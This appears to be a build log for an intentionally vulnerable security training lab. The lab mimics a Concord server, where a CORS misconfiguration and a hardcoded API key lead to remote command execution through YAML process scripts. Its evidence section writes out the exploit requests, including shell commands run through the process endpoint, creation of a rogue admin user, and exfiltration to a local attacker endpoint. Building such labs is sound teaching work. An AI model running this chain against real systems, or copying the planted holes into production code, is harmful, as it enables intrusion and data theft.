# lab-73-schist — Concord Auth Bypass to RCE

## Frame

- **Outcome**: lab-73-schist implements the Concord CSRF+CORS → RCE lesson chain, including all extra miles.
- **Success line**: CORS CSRF simulation delivers concordBot's YAML process to `/api/v1/process`, output readable from process endpoint; hardcoded API key in migrations/v0.69.0.js authenticates as concordBot directly; extra mile creates new user via internal API and reads FLAG_LOCAL.
- **Kill line**: None reached.
- **Smallest unit**: Hardcoded API key in migration + process execution endpoint (no CORS bot needed).
- **Type**: build

## Work

### What was implemented

**New files:**
- `labs/lab-73-schist/app.js` — Express app: CORS reflect middleware, session+API key auth, process submission (busboy multipart), YAML execution (js-yaml + execSync), attacker infrastructure, review queue
- `labs/lab-73-schist/workers/bot_worker.js` — URL queue processor with `simulateCorsPayload`: detects CORS CSRF pattern in visited page HTML, extracts YAML from `<template id="concord-payload">`, POSTs process as concordBot, exfiltrates instanceId
- `labs/lab-73-schist/migrations/v0.0.1.js` — creates tables: users, api_keys, processes, review_queue; seeds admin user
- `labs/lab-73-schist/migrations/v0.69.0.js` — inserts concordBot user with hardcoded API key (plaintext in comment: `mK4pQnLr3vWxZy9B`)
- `labs/lab-73-schist/migrations/run.js` — runs all migrations in order
- `labs/lab-73-schist/entrypoint.sh` — PG start, flag files, migration runner, app start
- `labs/lab-73-schist/package.json`
- `labs/lab-73-schist/Dockerfile`
- `labs/lab-73-schist/public/index.html` — login page
- `labs/lab-73-schist/REPORT_GUIDE.md`
- `hints/lab-73.json`

**Modified files:**
- `platform/app.py` — added lab-73-schist entry

### Key design decisions

1. **CORS behavior**: Non-OPTIONS requests with Origin header → server reflects Origin in ACAO + sets ACAC: true. OPTIONS requests → ACAO: * (no credential support). This means multipart/form-data POST (no preflight required) can exploit the CORS misconfiguration.

2. **Bot simulation**: Bot worker visits URLs from review_queue. `simulateCorsPayload()` detects the CORS CSRF pattern by looking for:
   - `/api/service/console/whoami` + `credentials: 'include'` in page body
   - `/api/v1/process` in page body
   - `<template id="concord-payload">` containing valid YAML
   Then POSTs YAML as concordBot (X-Bot-Session auth), sends instanceId to local `/attacker/collect`.

3. **YAML execution**: js-yaml parses uploaded `concord.yml`, finds `flows.default` steps with `script:` + `body:`, executes `body` via `execSync('/bin/sh')`. Output stored in processes table, retrievable via GET `/api/v1/process/:id`.

4. **Hardcoded API key**: `migrations/v0.69.0.js` has comment `// "mK4pQnLr3vWxZy9B"` above the bcrypt hash. Student reads source, finds plaintext, uses it as Authorization header.

5. **Extra mile — new user creation**: After RCE, student can POST to `/api/v1/user` (JSON, admin-only) to create a new admin user, then login to read FLAG_LOCAL.

## Evidence

```
# Chain 2: Hardcoded API key
Authorization: mK4pQnLr3vWxZy9B → {"realm":"apikey","username":"concordBot","displayName":"concordBot"}

# RCE via process (chain 2)
POST /api/v1/process (multipart concord.yml with flows.default script body: cat /flag_proof.txt)
→ {"instanceId":"...","ok":true}
GET /api/v1/process/:id → {"status":"FINISHED","output":"ARENA{test_proof}\n"}

# Extra mile: create user → login → FLAG_LOCAL
POST /api/v1/user {"username":"hacker","password":"hacker123","admin":true}
→ {"id":"...","username":"hacker"}
GET /api/service/console/whoami (Basic hacker:hacker123) → {"realm":"local","username":"hacker"}
GET /api/v1/process/:id (flag_local.txt) → {"output":"ARENA{test_local}\n"}

# Chain 1: CORS CSRF bot simulation
POST /attacker/files → upload payload.html with <template id="concord-payload"> YAML + CORS fetch JS
POST /api/v1/review {"url":"http://localhost:5000/attacker/files/payload.html"}
→ bot visits URL, detects CORS pattern, POSTs YAML as concordBot, polls output, exfiltrates flag
GET /api/attacker/results → [{"data":"ARENA{test_proof}\n","ts":"..."}]

# validate_labs.sh
Summary: 67 PASS, 0 WARN, 0 FAIL
```
